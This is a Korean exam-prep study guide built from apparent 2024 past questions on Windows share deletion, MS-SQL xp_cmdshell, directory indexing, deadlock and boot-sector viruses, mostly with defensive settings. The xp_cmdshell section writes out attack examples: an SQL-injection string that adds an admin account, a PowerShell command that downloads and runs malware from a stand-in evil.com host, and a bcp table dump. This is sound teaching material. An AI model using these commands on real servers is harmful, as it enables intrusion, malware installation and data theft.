# Windows 추가 기출 - 공유폴더, DB 보안, 디렉토리 인덱싱

## 🔴 Windows 공유폴더 삭제 명령어 ★★★

### 문제 (2024년 기출)
```
Windows에서 공유폴더를 삭제하는 명령어는?
```

### ✅ 정답
```
net share [공유이름] /delete ★★★

또는

net share [공유이름] /del
```

### 상세 설명

**net share 명령어 사용법:**

1. 공유 목록 확인 ★★★
```cmd
net share

출력 예시:
공유 이름    리소스                         설명
-------------------------------------------------------------------------------
C$           C:\                            기본 공유
IPC$                                        원격 IPC
ADMIN$       C:\Windows                     원격 관리
MyShare      C:\SharedFolder                사용자 공유
```

2. 공유폴더 생성
```cmd
net share ShareName=C:\FolderPath

예시:
net share MyDocs=C:\Documents /REMARK:"문서 공유"
```

3. 공유폴더 삭제 ★★★
```cmd
net share MyShare /delete

또는

net share MyShare /del
```

4. 기본 공유 ($로 끝나는 공유)
```
C$, D$, ADMIN$, IPC$ 등은 기본 공유
보안상 불필요 시 삭제 권장 ★★

삭제:
net share C$ /delete
net share ADMIN$ /delete

주의: 시스템 재부팅 시 자동 재생성됨
영구 삭제는 레지스트리 수정 필요
```

5. 권한 설정
```cmd
net share MyShare=C:\Folder /GRANT:user,READ
net share MyShare=C:\Folder /GRANT:admin,FULL
```

**GUI 방법:**
- 컴퓨터 관리 → 공유 폴더 → 공유
- 우클릭 → 공유 중지

**보안 고려사항:**

1. 불필요한 공유 제거 ★★★
   - 정기적으로 net share 확인
   - 사용하지 않는 공유 삭제

2. 기본 공유 보안
   - C$, ADMIN$는 관리자만 접근 가능
   - 외부 접근 차단 (방화벽)

3. 공유 권한
   - Everyone 권한 제거 ★★
   - 필요한 사용자만 부여

4. 네트워크 공유 비활성화
   - Server 서비스 중지
   ```cmd
   net stop server
   ```

**실기 답안:**
```
net share [공유이름] /delete
```

---

## 🔴 MS-SQL xp_cmdshell ★★★

### 문제 (2024년 기출)
```
MS-SQL에서 보안 취약점이 있는 확장 저장 프로시저는?
```

### ✅ 정답
```
xp_cmdshell ★★★
```

### 상세 설명

**xp_cmdshell이란?**

MS-SQL Server의 확장 저장 프로시저(Extended Stored Procedure)
운영체제 명령어를 SQL Server에서 직접 실행 가능 ★★★

**기능:**
```sql
-- Windows 명령어 실행
EXEC xp_cmdshell 'dir C:\'
EXEC xp_cmdshell 'whoami'
EXEC xp_cmdshell 'net user hacker pass123 /add'
```

**보안 위험:** ★★★

1. 명령어 인젝션 (Command Injection)
   - SQL Injection과 결합 시 치명적
   - OS 명령어 실행 가능

   공격 예시:
   ```sql
   -- SQL Injection으로 관리자 계정 추가
   '; EXEC xp_cmdshell 'net user admin admin123 /add' --
   ```

2. 권한 상승
   - SQL Server 계정으로 OS 명령 실행
   - 시스템 권한 획득 가능

3. 악성코드 다운로드/실행
   ```sql
   EXEC xp_cmdshell 'powershell -c "IWR http://evil.com/malware.exe -OutFile C:\temp\m.exe"'
   EXEC xp_cmdshell 'C:\temp\m.exe'
   ```

4. 데이터 유출
   ```sql
   EXEC xp_cmdshell 'bcp "SELECT * FROM Users" queryout "C:\data.txt" -c'
   ```

**기본 상태:**
- SQL Server 2005 이후: 기본적으로 비활성화 ★★
- 보안상 이유로 사용 금지 권장

**활성화 여부 확인:**
```sql
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell'
-- value = 0 (비활성화)
-- value = 1 (활성화)
```

**비활성화 방법:** ★★★
```sql
-- 고급 옵션 허용
EXEC sp_configure 'show advanced options', 1
RECONFIGURE

-- xp_cmdshell 비활성화
EXEC sp_configure 'xp_cmdshell', 0
RECONFIGURE
```

**대안:**

1. CLR (Common Language Runtime) 사용
   - .NET 어셈블리로 안전하게 구현

2. SQL Server Agent 작업
   - 예약된 작업으로 실행

3. 외부 프로그램 사용
   - 응용 프로그램에서 처리

**기타 위험한 확장 프로시저:**

- xp_regread: 레지스트리 읽기
- xp_regwrite: 레지스트리 쓰기 ★★
- xp_dirtree: 디렉토리 구조 탐색
- xp_fileexist: 파일 존재 확인
- sp_OACreate: COM 객체 생성

**점검 항목:**
- xp_cmdshell 비활성화 ★★★
- 불필요한 확장 프로시저 제거
- SQL Server 최소 권한 부여
- SQL Injection 방어

**실기 답안:**
```
xp_cmdshell

(MS-SQL에서 OS 명령어를 실행할 수 있는 확장 저장 프로시저로,
보안상 위험하여 비활성화 권장)
```

---

## 🔴 디렉토리 인덱싱 (Directory Indexing) ★★★

### 문제 (2024년 기출)
```
웹페이지에서 디렉토리 목록이 보이는 화면이 나타났다.
이것은 무슨 취약점인가?
```

### ✅ 정답
```
디렉토리 인덱싱 (Directory Indexing) ★★★
또는
디렉토리 리스팅 (Directory Listing)
```

### 상세 설명

**디렉토리 인덱싱이란?**

웹 서버가 index 파일이 없는 디렉토리에 접근 시
해당 디렉토리의 파일 목록을 자동으로 표시하는 기능

**화면 예시:**
```
Index of /upload

Name                    Last modified      Size
Parent Directory                            -
config.bak             2024-01-15 10:30    2.1K
database.sql           2024-01-14 15:20   150.5K
backup.zip             2024-01-10 09:15    45.2M
password.txt           2024-01-05 08:00    0.5K
```

**보안 위험:** ★★★

1. 정보 노출
   - 파일/디렉토리 구조 노출 ★★★
   - 파일명으로 시스템 정보 추측

2. 민감 파일 접근
   - 백업 파일 (*.bak, *.old)
   - 설정 파일 (config.php, web.config)
   - 데이터베이스 덤프 (*.sql)
   - 소스 코드 (*.inc, *.conf)

3. 공격 표면 확대
   - 공격자가 타겟 파일 쉽게 발견
   - 숨겨진 관리 페이지 노출

**발생 원인:**

1. index 파일 없음
   - index.html, index.php, default.asp 등이 없을 때

2. 웹 서버 기본 설정
   - Apache: Options +Indexes
   - IIS: 디렉토리 검색 사용

**방어 방법:** ★★★

### Apache 설정

1. .htaccess 파일
```apache
# 디렉토리 인덱싱 비활성화 ★★★
Options -Indexes

# 또는 403 Forbidden 반환
<IfModule mod_autoindex.c>
    Options -Indexes
</IfModule>
```

2. httpd.conf 설정
```apache
<Directory "/var/www/html">
    Options -Indexes +FollowSymLinks
    AllowOverride None
</Directory>
```

### IIS 설정

1. IIS 관리자
   - 사이트 선택 → 디렉토리 검색
   - "사용 안 함" 선택 ★★★

2. web.config 파일
```xml
<configuration>
  <system.webServer>
    <directoryBrowse enabled="false" />
  </system.webServer>
</configuration>
```

### Nginx 설정

```nginx
location / {
    autoindex off;  # 디렉토리 인덱싱 비활성화 ★★★
}
```

**추가 보안 조치:**

1. index 파일 배치 ★★
   - 모든 디렉토리에 index.html 배치
   - 비어있는 index.html도 효과적

2. 민감 파일 제거
   - 백업 파일 삭제
   - 불필요한 파일 정리

3. 접근 제어
   ```apache
   # 특정 디렉토리 접근 차단
   <Directory "/var/www/html/backup">
       Require all denied
   </Directory>
   ```

4. 파일 확장자 제한
   ```apache
   # .bak, .old 파일 접근 차단
   <FilesMatch "\.(bak|old|sql|conf)$">
       Require all denied
   </FilesMatch>
   ```

**점검 방법:**

1. 수동 확인
   ```
   http://example.com/upload/
   http://example.com/backup/
   http://example.com/admin/
   ```

2. 자동 스캔 도구
   - Nikto
   ```bash
   nikto -h http://example.com
   ```

   - DirBuster / Dirsearch
   ```bash
   dirsearch -u http://example.com -e php,html
   ```

**관련 취약점:**

- Path Traversal (디렉토리 탐색)
- Information Disclosure (정보 노출)
- Sensitive Data Exposure (민감 데이터 노출)

**실기 답안:**
```
디렉토리 인덱싱 (Directory Indexing)

방어:
- Apache: Options -Indexes
- IIS: 디렉토리 검색 사용 안 함
- 모든 디렉토리에 index 파일 배치
```

---

## 🔴 교착상태 (Deadlock) ★★

### 문제 (2024년 기출)
```
메모리 교착 관련 문제
```

### ✅ 정답
```
교착상태 (Deadlock)
```

### 상세 설명

**교착상태란?**

두 개 이상의 프로세스가 서로가 가진 자원을 기다리며
무한정 대기하는 상태 ★★★

**발생 조건 (4가지 모두 충족 시):** ★★★

1. 상호 배제 (Mutual Exclusion)
   - 자원은 한 번에 한 프로세스만 사용

2. 점유와 대기 (Hold and Wait)
   - 자원을 가진 채로 다른 자원 대기 ★★

3. 비선점 (No Preemption)
   - 강제로 자원을 빼앗을 수 없음

4. 순환 대기 (Circular Wait) ★★★
   - 프로세스들이 순환 형태로 자원 대기
   - A → B → C → A

**예시:**

```
프로세스 P1:
1. 자원 R1 획득
2. 자원 R2 요청 (대기)

프로세스 P2:
1. 자원 R2 획득
2. 자원 R1 요청 (대기)

결과: P1 ↔ P2 교착상태! ★★★
```

**교착상태 해결 방법:**

### 1. 예방 (Prevention) ★★

4가지 조건 중 하나를 부정

- 상호 배제 부정: 자원 공유 (현실적으로 어려움)
- 점유와 대기 부정: 모든 자원을 한 번에 할당
- 비선점 부정: 자원 강제 회수
- 순환 대기 부정: 자원에 순서 부여 ★★★

```
자원 순서: R1 < R2 < R3
모든 프로세스는 순서대로만 요청
→ 순환 대기 방지
```

### 2. 회피 (Avoidance) ★★

은행원 알고리즘 (Banker's Algorithm)
- 안전 상태 유지
- 불안전한 상태로 갈 요청은 거부

### 3. 탐지 및 회복 (Detection & Recovery)

탐지:
- 자원 할당 그래프로 순환 탐지
- 주기적으로 교착상태 검사

회복:
- 프로세스 종료 (하나씩 또는 전체)
- 자원 선점 (Rollback)

### 4. 무시

- 교착상태 발생 확률이 낮으면 무시
- 대부분의 OS가 채택 (성능상 이유)

**데이터베이스 교착상태:**

```sql
-- Transaction 1
BEGIN TRANSACTION
UPDATE Account SET balance = balance - 100 WHERE id = 1
-- (Transaction 2의 락 대기)
UPDATE Account SET balance = balance + 100 WHERE id = 2
COMMIT

-- Transaction 2
BEGIN TRANSACTION
UPDATE Account SET balance = balance - 50 WHERE id = 2
-- (Transaction 1의 락 대기)
UPDATE Account SET balance = balance + 50 WHERE id = 1
COMMIT
```

해결:
- Timeout 설정
- 트랜잭션 순서 통일 ★★
- 락 단위 최소화

**실기 답안:**
```
교착상태 (Deadlock)

발생 조건 (4가지):
1. 상호 배제
2. 점유와 대기
3. 비선점
4. 순환 대기 ★★★

해결:
- 예방: 순환 대기 방지 (자원 순서 부여)
- 회피: 은행원 알고리즘
- 탐지 및 회복
```

---

## 🔴 부트섹터 바이러스 ★★

### 문제 (2024년 기출)
```
부트섹터 바이러스 설명 중 틀린 것은?
1) MBR에 감염
2) 부팅 시 실행
3) ROM BIOS에 위치 ← 틀림! ★★★
4) 플로피 디스크로 전파
```

### ✅ 정답
```
3) ROM BIOS에 위치 (틀림!)

부트섹터 바이러스는 디스크의 부트섹터(MBR)에 위치
ROM BIOS는 하드웨어에 있으며 감염 대상이 아님 ★★★
```

### 상세 설명

**부트섹터 바이러스:**

정의:
디스크의 부트섹터(MBR, Master Boot Record)를 감염시키는 바이러스

**특징:**

1. 감염 위치 ★★★
   - MBR (Master Boot Record)
   - 하드디스크 첫 번째 섹터 (0번 섹터)
   - ROM BIOS 아님! (ROM은 읽기 전용 메모리)

2. 실행 시점
   - 시스템 부팅 시 자동 실행 ★★★
   - OS보다 먼저 로드

3. 전파 방법
   - 감염된 플로피 디스크
   - USB 드라이브
   - 외부 저장 매체

**부팅 순서:**

```
1. 전원 ON
2. ROM BIOS 실행 (POST)
3. MBR 로드 ← 부트섹터 바이러스 실행! ★★★
4. 부트로더 실행
5. OS 커널 로드
```

**주요 부트섹터 바이러스:**

- Brain (1986년, 최초의 PC 바이러스)
- Stoned
- Michelangelo
- Disk Killer

**증상:**

- 부팅 실패
- 부팅 속도 저하
- 파티션 테이블 손상
- 데이터 손실

**방어:**

1. BIOS 부팅 순서 변경 ★★
   - 하드디스크 우선
   - USB/CD 부팅 비활성화

2. 백신 부트 디스크
   - 클린 부팅 매체로 복구

3. MBR 백업
   ```bash
   # Linux
   dd if=/dev/sda of=mbr.backup bs=512 count=1
   ```

4. UEFI Secure Boot ★★★
   - 서명된 부트로더만 실행
   - 부트섹터 바이러스 차단

**vs 파일 바이러스:**

┌──────────────┬──────────────┬──────────────┐
│    구분      │ 부트섹터    │  파일 바이러스│
├──────────────┼──────────────┼──────────────┤
│ 감염 대상    │ MBR ★★★    │ 실행 파일    │
├──────────────┼──────────────┼──────────────┤
│ 실행 시점    │ 부팅 시 ★★ │ 파일 실행 시 │
├──────────────┼──────────────┼──────────────┤
│ 전파         │ 외부 매체   │ 파일 복사    │
└──────────────┴──────────────┴──────────────┘

**실기 답안:**
```
부트섹터 바이러스는 MBR에 감염되며,
ROM BIOS에 위치하지 않음 ★★★

(ROM BIOS는 읽기 전용 하드웨어 메모리)
```

---

## 🎯 핵심 암기 카드

### 카드 1: Windows 공유폴더
```
삭제: net share [공유이름] /delete ★★★
확인: net share
기본 공유 (C$, ADMIN$) 불필요 시 삭제
```

### 카드 2: xp_cmdshell
```
MS-SQL 확장 저장 프로시저
OS 명령어 실행 가능 ★★★
보안상 비활성화 필수
EXEC sp_configure 'xp_cmdshell', 0
```

### 카드 3: 디렉토리 인덱싱
```
index 파일 없을 때 디렉토리 목록 노출
Apache: Options -Indexes ★★★
IIS: 디렉토리 검색 사용 안 함
```

### 카드 4: 교착상태
```
4가지 조건: 상호배제, 점유와대기, 비선점, 순환대기 ★★★
예방: 자원 순서 부여 (순환 대기 방지)
회피: 은행원 알고리즘
```

### 카드 5: 부트섹터 바이러스
```
MBR에 감염 (ROM BIOS 아님!) ★★★
부팅 시 자동 실행
방어: UEFI Secure Boot
```

---

## 🔥 실기 시험 최빈출

```
1위: xp_cmdshell (보안 취약점)     ← 2024년 출제! ★★★
2위: 디렉토리 인덱싱 (Options -Indexes) ← 2024년 출제! ★★★
3위: 교착상태 (4가지 조건)          ← 2024년 출제!
4위: net share (공유폴더 삭제)      ← 2024년 출제!
5위: 부트섹터 바이러스 (MBR)        ← 2024년 출제!
```

**✅ xp_cmdshell은 MS-SQL 최대 보안 취약점!**
**✅ 디렉토리 인덱싱은 Options -Indexes로 방어!**
**✅ 교착상태 4가지 조건 필수 암기!**
